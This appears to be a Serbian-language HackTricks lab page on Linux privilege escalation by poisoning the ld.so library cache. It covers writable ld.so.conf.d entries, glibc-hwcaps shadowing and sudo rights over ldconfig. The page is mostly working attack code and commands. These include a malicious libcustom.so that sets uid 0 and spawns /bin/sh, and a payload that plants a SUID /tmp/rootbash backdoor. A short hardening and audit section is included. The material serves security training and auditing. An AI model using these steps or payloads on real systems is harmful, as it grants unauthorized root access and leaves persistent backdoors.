# ld.so privesc exploit primer

{{#include ../../banners/hacktricks-training.md}}

Ova stranica je fokusirana laboratorijska vežba za trovanje **keša sistemskog linkera kroz `/etc/ld.so.conf` ili `ldconfig`**. Za injection biblioteka koje nedostaju, upisivi `RPATH`/`RUNPATH`, `LD_PRELOAD` i druge generičke SUID zloupotrebe linkera pogledajte [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Priprema okruženja

U sledećem odeljku možete pronaći kod datoteka koje ćemo koristiti za pripremu okruženja

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Kreirajte** te fajlove na svojoj mašini u istoj fascikli
2. **Kompajlirajte** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopirajte** `libcustom.so` u `/usr/lib` i osvežite keš: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privilegije)
4. **Kompajlirajte** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Proverite okruženje

Proverite da li se _libcustom.so_ **učitava** iz _/usr/lib_ i da li možete da **izvršite** binarni fajl.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Korisne komande za trijažu

Prilikom napada na stvarnu metu, proverite **tačan naziv biblioteke** koji binarni fajl zahteva, šta loader **trenutno razrešava** i koje konfigurisane putanje su upisive bez menjanja aktivnog keša.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Koristite `ldd` samo na **pouzdanom** izvršnom fajlu. Neke implementacije ili neuobičajeni ELF interpreteri mogu izazvati izvršavanje koda pod kontrolom napadača; `objdump -p ./file | grep NEEDED` bezbedno prikazuje direktne zavisnosti. Za pouzdanu metu, pozivanje otkrivenog interpretera sa `--list` prikazuje stvarnu rezoluciju.<sup>[[4]](#references)</sup>

Nekoliko korisnih napomena:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` obično **ne radi** zato što preusmeravanje izvršava vaša trenutna shell sesija. Umesto toga koristite
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privileged** binarni fajlovi rade u **secure-execution mode**: `LD_LIBRARY_PATH`
se ignoriše, dok je `LD_PRELOAD` ograničen (imena koja sadrže kosu crtu se ignorišu, a mogu se preloadovati samo biblioteke označene kao setuid u standardnim direktorijumima). Kada root pokrene `ldconfig`, direktorijumi navedeni u
`/etc/ld.so.conf` mogu dospeti u `/etc/ld.so.cache`, pa ova pogrešna konfiguracija i dalje može uticati na privileged programe.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` se takođe ignoriše u secure-execution mode osim ako postoji `/etc/suid-debug`, zato njegov trace prikupljajte iz ekvivalentnog non-SUID pokretanja umesto da očekujete izlaz iz privileged izvršavanja.<sup>[[1]](#references)</sup>
- Na glibc 2.33 i novijim verzijama, dynamic loader takođe nudi
`--list-diagnostics`, koji ispisuje mašinski čitljivu dijagnostiku loadera i informacije o ugrađenim search-path vrednostima kada hijack ne funkcioniše očekivano.<sup>[[1]](#references)[[6]](#references)</sup>

### Ograničenja cache-a i SONAME-a

`ldconfig` ne kešira svaki proizvoljni fajl u konfigurisanom direktorijumu: ispituje ELF zaglavlja, prepoznaje imena koja odgovaraju obrascu `lib*.so*` ili `ld-*.so*` i očekuje konvencionalni lanac `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Injected objekat zato mora imati ciljnu arhitekturu/klasu, tačno `DT_NEEDED` ime (obično njegov `DT_SONAME`) i sve simbole/verzije koje victim razrešava.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Dajte prednost biblioteci specifičnoj za cilj, kao u ovom primeru. Shadowing uobičajenog SONAME-a nepotpunim objektom može pokvariti svaki proces koji ga razreši pre nego što se pokrene predviđeni privilegovani cilj.<sup>[[3]](#references)</sup>

## Exploit

U ovom scenariju pretpostavimo da je administrator dodao ranjivu stavku u
datoteku unutar `/etc/ld.so.conf.d/`, koju uključuje sistemska datoteka
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Ranjivi direktorijum je _/home/ubuntu/lib_ (gde imamo pristup pisanju).\
**Preuzmite i kompajlirajte** sledeći kod unutar te putanje:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ako očekujete da će **root** (ili drugi privilegovani nalog) kasnije izvršiti ranjivi binarni fajl, obično je bolje ostaviti **root-owned artifact** umesto pokretanja interaktivnog shell-a. Na primer:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Zatim, nakon što se privilegovano izvršavanje obavi, možete koristiti `/tmp/rootbash -p`.

Sada kada smo **kreirali zlonamernu libcustom biblioteku unutar pogrešno konfigurisane** putanje, podrazumevani keš mora biti ponovo izgrađen uspešnim privilegovanim pokretanjem **`ldconfig`**. Ponovno pokretanje sistema pomaže samo tamo gde ga lokalni proces pokretanja sistema zaista poziva; u suprotnom sačekajte intervenciju administratora ili koristite nebezbedno sudo pravilo ako je dostupno.<sup>[[2]](#references)</sup>

Kada se to dogodi, **ponovo proverite** odakle izvršna datoteka `sharedvuln` učitava biblioteku `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kao što možete videti, **učitava je iz `/home/ubuntu/lib`**, a ako je bilo koji korisnik izvrši, biće pokrenut shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Imajte na umu da u ovom primeru nismo eskalirali privilegije, ali izmenom izvršavanih komandi i **čekanjem da root ili drugi privilegovani korisnik izvrši ranjivi binarni fajl** moći ćemo da eskaliramo privilegije.

### Moderno `glibc-hwcaps` shadowing

Od verzije glibc 2.33, loader može dati prednost optimizovanim bibliotekama unutar `glibc-hwcaps/<level>/` u **svakom direktorijumu za pretragu biblioteka**. Zbog toga provera samo direktorijuma `/home/ubuntu/lib` nije dovoljna: kompatibilni poddirektorijum sa dozvolom upisa, kao što je `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, može shadowovati osnovnu biblioteku nakon što ga `ldconfig` indeksira, dok drugi CPU-ovi nastavljaju da koriste osnovni objekat. Ovo takođe omogućava arhitekturski selektivan hijack koji može biti propušten kada se validacija obavlja na drugom CPU-u.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Trenutne smernice za hardening glibc-a preporučuju izbegavanje duplih SONAME-ova, nestandardnih lokacija za pretragu i objekata u `glibc-hwcaps` poddirektorijumima. Iz perspektive audita, rekurzivno proverite vlasništvo i dozvole za pisanje nad konfigurisanim direktorijumima i svim komponentama njihovih nadređenih putanja.<sup>[[3]](#references)</sup>

### Druge pogrešne konfiguracije - Ista ranjivost

U prethodnom primeru smo simulirali pogrešnu konfiguraciju u kojoj je administrator **postavio folder bez privilegija unutar konfiguracione datoteke u `/etc/ld.so.conf.d/`**.\
Ali postoje i druge pogrešne konfiguracije koje mogu izazvati istu ranjivost: ako imate **dozvole za pisanje** u učitanu **konfiguracionu datoteku**, možete kreirati datoteku u direktorijumu `/etc/ld.so.conf.d/` u koji je moguće pisati ili možete pisati u `/etc/ld.so.conf`, možete konfigurisati i iskoristiti istu ranjivost.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Pretpostavimo da imate sudo privilegije nad `ldconfig`**.\
Možete navesti **koju konfiguracionu datoteku treba da pročita** pomoću opcije `-f`, tako da datoteka koja navodi direktorijume pod kontrolom napadača može naterati `ldconfig` da doda te foldere u cache.<sup>[[2]](#references)</sup>\
Dakle, kreirajmo datoteke i foldere potrebne za učitavanje putanje "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sada, kao što je navedeno u **prethodnom exploit-u**, **kreirajte zlonamernu biblioteku unutar `/tmp`**.\
I konačno, učitajmo putanju i proverimo odakle binarni fajl učitava biblioteku:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kao što možete videti, ako imate sudo privilegije nad `ldconfig`, možete iskoristiti istu ranjivost.** Detalji opcija su važni prilikom procene ograničenog sudo pravila: `-f` bira drugu konfiguraciju, ali i dalje ponovo izgrađuje `/etc/ld.so.cache`; `-C` preusmerava keš na drugo mesto; `-N` sprečava ponovno izgrađivanje keša; a `-X` sprečava ažuriranje linkova, ali **i dalje ponovo izgrađuje keš osim ako se koristi zajedno sa `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux stranica priručnika](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux stranica priručnika](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Ojačavanje Dynamic Linker-a - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux stranica priručnika](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dijagnostika Dynamic Linker-a (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
